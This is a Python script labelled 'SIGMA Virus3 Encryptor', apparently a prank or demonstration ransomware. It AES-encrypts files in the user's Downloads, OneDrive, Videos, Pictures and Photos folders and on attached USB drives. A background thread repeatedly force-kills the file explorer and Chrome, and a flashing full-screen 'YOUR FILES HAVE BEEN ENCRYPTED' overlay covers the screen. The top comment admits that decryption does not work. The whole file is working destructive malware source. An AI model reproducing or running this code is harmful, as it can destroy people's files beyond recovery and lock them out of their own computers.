# decryption doesnt work so put important files in a folder -or- use a vm

import os
import sys
import random
import pygame
import platform
import threading
import time
import ctypes
import subprocess
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

SOUND_PATH = "alarm.wav"

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=200000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def encrypt_bytes(data: bytes, password: str) -> bytes:
    salt = os.urandom(16)
    iv = os.urandom(16)
    key = derive_key(password, salt)

    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ct = encryptor.update(padded) + encryptor.finalize()

    return salt + iv + ct

def decrypt_bytes(blob: bytes, password: str) -> bytes:
    salt, iv, ct = blob[:16], blob[16:32], blob[32:]
    key = derive_key(password, salt)

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ct) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded) + unpadder.finalize()

    return data

def encrypt_files_to_enc_folder(folder: Path, password: str):
    enc_folder = folder / "enc"
    enc_folder.mkdir(exist_ok=True)

    for f in folder.iterdir():
        if f.is_file() and f.name != "enc":
            target_path = enc_folder / f.name
            try:
                f.rename(target_path)
                with open(target_path, 'rb') as file:
                    data = file.read()
                enc_data = encrypt_bytes(data, password)
                with open(target_path, 'wb') as file:
                    file.write(enc_data)
                print(f"[+] Encrypted: {target_path}")
            except Exception as e:
                print(f"[!] Failed to encrypt {f}: {e}")

def decrypt_files_from_enc_folder(folder: Path, password: str):
    enc_folder = folder / "enc"
    if not enc_folder.exists() or not enc_folder.is_dir():
        print(f"[-] No enc folder in {folder}")
        return

    for f in enc_folder.iterdir():
        if f.is_file():
            try:
                with open(f, 'rb') as file:
                    data = file.read()
                dec_data = decrypt_bytes(data, password)
                orig_path = folder / f.name
                with open(orig_path, 'wb') as file:
                    file.write(dec_data)
                print(f"[+] Decrypted: {orig_path}")
                f.unlink()
            except Exception as e:
                print(f"[!] Failed to decrypt {f}: {e}")

def get_common_folders():
    user_home = Path.home()
    folders = [
        user_home / "Downloads",
        user_home / "OneDrive",
        user_home / "Videos",
        user_home / "Pictures",
        user_home / "Photos"
    ]

    usb_drives = []
    if platform.system() == "Windows":
        import string
        DRIVE_REMOVABLE = 2
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive = f"{letter}:\\"
                if ctypes.windll.kernel32.GetDriveTypeW(drive) == DRIVE_REMOVABLE:
                    usb_drives.append(Path(drive))
            bitmask >>= 1
    else:
        for base in [Path("/media"), Path("/Volumes")]:
            if base.exists():
                for d in base.iterdir():
                    if d.is_dir():
                        usb_drives.append(d)

    existing_folders = [f for f in folders if f.exists()]
    return existing_folders + usb_drives

def force_close_apps():
    system = platform.system()
    while True:
        try:
            if system == "Windows":
                subprocess.call(['taskkill', '/F', '/IM', 'explorer.exe'])
                subprocess.call(['taskkill', '/F', '/IM', 'chrome.exe'])
            elif system == "Darwin":
                subprocess.call(['osascript', '-e', 'tell application "Finder" to quit'])
            else:
                subprocess.call(['pkill', 'nautilus'])
        except Exception:
            pass
        time.sleep(1)

def animated_text(screen, font, text, pos, frame):
    x_base, y = pos
    x = x_base + int(50 * (0.5 + 0.5 * math.sin(frame / 10)))
    rendered = font.render(text, True, (255, 255, 255))
    screen.blit(rendered, (x, y))

import math

def show_overlay(password: str, mode: str):
    pygame.init()
    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    pygame.display.set_caption("SIGMA VIRUS3")
    font_big = pygame.font.SysFont("Courier", 72, bold=True)
    font_small = pygame.font.SysFont("Courier", 32)
    clock = pygame.time.Clock()

    try:
        if os.path.exists(SOUND_PATH):
            pygame.mixer.init()
            sound = pygame.mixer.Sound(SOUND_PATH)
            sound.play(-1)
    except Exception as e:
        print("[!] Sound error:", e)

    folders = get_common_folders()

    action_done = False
    running = True
    frame_count = 0

    close_thread = threading.Thread(target=force_close_apps, daemon=True)
    close_thread.start()

    while running:
        screen.fill((random.randint(0,255), random.randint(0,255), random.randint(0,255)))

        msg = "YOUR FILES HAVE BEEN " + ("ENCRYPTED" if mode == 'encrypt' else "DECRYPTED")
        virus = "BY SIGMA VIRUS3"
        hint = "(Press CTRL + K to unlock)"

        t1 = font_big.render(msg, True, (0,0,0))
        t2 = font_big.render(virus, True, (0,0,0))
        t3 = font_small.render(hint, True, (255,255,255))

        screen.blit(t1, t1.get_rect(center=(screen.get_width()//2, screen.get_height()//2 - 100)))
        screen.blit(t2, t2.get_rect(center=(screen.get_width()//2, screen.get_height()//2)))
        screen.blit(t3, t3.get_rect(center=(screen.get_width()//2, screen.get_height() - 60)))

        animated_text(screen, font_small, "SIGMA", (50, screen.get_height() - 150), frame_count)
        animated_text(screen, font_small, "VIRUS", (200, screen.get_height() - 150), frame_count + 10)
        animated_text(screen, font_small, "3.0", (350, screen.get_height() - 150), frame_count + 20)

        pygame.display.flip()
        clock.tick(30)
        frame_count += 1

        for event in pygame.event.get():
            if event.type == pygame.KEYDOWN:
                keys = pygame.key.get_pressed()
                if keys[pygame.K_k] and (keys[pygame.K_LCTRL] or keys[pygame.K_RCTRL]):
                    if not action_done:
                        for folder in folders:
                            try:
                                if mode == 'encrypt':
                                    encrypt_files_to_enc_folder(folder, password)
                                else:
                                    decrypt_files_from_enc_folder(folder, password)
                            except Exception as e:
                                print(f"[!] Failed processing {folder}: {e}")
                        action_done = True
                    else:
                        running = False

    pygame.quit()

if __name__ == "__main__":
    print("== SIGMA Virus3 Encryptor ==")
    mode = input("Mode (e)ncrypt / (d)ecrypt: ").strip().lower()
    password = input("Enter password: ")

    show_overlay(password, 'encrypt' if mode == 'e' else 'decrypt')
